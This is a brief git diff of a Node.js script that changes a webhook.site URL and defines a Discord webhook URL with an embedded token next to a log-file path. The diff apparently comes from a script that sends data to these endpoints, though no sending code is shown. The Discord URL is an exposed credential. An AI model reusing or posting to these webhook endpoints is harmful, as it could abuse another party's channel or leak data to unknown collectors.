@@ -2,7 +2,7 @@ const axios = require('axios');
 const fs = require('fs');
 const path = require('path');
 
-const webhookSiteUrl = 'https://webhook.site/f941bb91-f1e2-4d38-87f2-846d75759558';
+const webhookSiteUrl = 'https://webhook.site/afd94cb4-dbc2-49e0-acee-ed69ea06b26c';
 const discordWebhookUrl = 'https://discord.com/api/webhooks/1274652381203660923/r88yriOiZcv6kzvBksSNGF4UnCtn8LSJPfx5wQZDgr0YiBpMOg7fzMEMpGLyKiLcEpKd';
 
 // Path to the log file
